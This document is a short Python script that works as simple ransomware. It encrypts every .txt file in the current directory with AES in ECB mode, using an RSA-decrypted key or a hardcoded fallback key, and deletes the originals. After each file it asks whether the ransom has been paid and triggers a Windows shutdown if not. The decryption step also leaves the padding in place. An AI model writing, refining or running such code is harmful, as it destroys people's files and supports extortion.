import os
import rsa
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad


with open("privatekey.pem",'rb') as f:
    privatekey1=rsa.PrivateKey.load_pkcs1(f.read())

with open("aeskeyencrypted","rb") as f:
    encryptedmessage=f.read()

decryptedkey=rsa.decrypt(encryptedmessage,privatekey1).decode()

def check_key_length(decrypted_message):
    key_lengths = [16, 24, 32]  
    if len(decrypted_message) in key_lengths:
        return decrypted_message.encode('utf-8')
    else:
        
        return "abcdefghijklmnop".encode('utf-8')

key = check_key_length(decryptedkey)


cipher = AES.new(key, AES.MODE_ECB)


def decrypt():
    decypteddata=cipher.decrypt(ciphertext)
    decrypted_file_name = f"decrypted_{file}"
    with open(decrypted_file_name, 'wb') as f:
        f.write(decypteddata)

curr_dir=os.getcwd()
files=os.listdir(curr_dir)
for file in files:
    if ".txt" in file:
        with open(file,'rb') as f:
            data=f.read()
        
        padded_data = pad(data, AES.block_size)
        ciphertext = cipher.encrypt(padded_data)
        new_file_name = f"encrypted_{file}"
        with open(new_file_name, 'wb') as f:
            f.write(ciphertext)
        os.remove(file)

        question=input("have you paid the ransom")
        if question=="yes":
            decrypt()
        else:
            os.system("shutdown /s /t 60")
        
        
        
        
        





